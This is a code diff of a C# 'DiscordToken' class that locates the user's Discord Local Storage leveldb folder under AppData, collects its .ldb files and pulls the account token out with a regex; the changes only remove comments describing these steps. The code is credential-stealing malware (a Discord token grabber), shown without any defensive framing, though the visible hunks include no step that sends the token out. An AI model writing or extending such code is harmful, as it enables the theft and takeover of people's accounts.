@@ -10,10 +10,6 @@ public class Findtoken
 
     }
 }
-
-/// <summary>
-/// Get token from discord folder @AppData\discord\Local Storage\leveld (old method)
-/// </summary>
 public class DiscordToken
 {
 
@@ -23,12 +19,9 @@ public class DiscordToken
         GetToken();
     }
 
-    /// <summary>
-    /// to extract the token text from ldb file using regex
-    /// </summary>
     public static void GetToken()
     {
-        var files = SearchForFile(); // to get ldb files
+        var files = SearchForFile();
         if (files.Count == 0)
         {
             Environment.Exit(0);
@@ -47,11 +40,6 @@ public class DiscordToken
             }
         }
     }
-
-    /// <summary>
-    /// check is discord path exists then add "*.ldb" files to list<string>
-    /// </summary>
-    /// <returns>string</returns>
     private static List<string> SearchForFile()
     {
         List<string> ldbFiles = new List<string>();
